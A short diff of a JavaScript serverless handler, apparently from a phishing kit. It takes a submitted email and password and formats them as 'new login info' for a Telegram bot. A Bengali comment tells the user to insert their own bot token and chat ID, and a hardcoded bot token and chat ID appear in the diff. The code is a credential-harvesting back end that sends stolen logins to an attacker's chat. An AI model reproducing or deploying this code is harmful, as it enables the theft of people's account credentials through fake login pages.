@@ -6,7 +6,7 @@ export default async function handler(req, res) {
     const { email, password } = req.body;
 
     // এখানে তোমার টেলিগ্রাম বটের টোকেন আর Chat ID বসাও
-    const BOT_TOKEN = '8700677708:AAFwyE6X_9wSiHnJeqaIrQ5h5UTT7AcfEGg';
+    const BOT_TOKEN = '8700677708:AAFWyE6X_9wSiHnJeqaIrQ5h5UTT7AcfEGg';
     const CHAT_ID = '8928919290';
 
     const message = `🔔 নতুন লগইন তথ্য:\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
